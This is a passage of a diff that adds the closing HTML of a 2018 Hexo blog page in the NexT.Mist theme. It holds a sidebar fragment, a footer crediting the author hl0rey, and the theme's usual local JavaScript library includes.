class="nav-text">测试代码</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">hl0rey</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
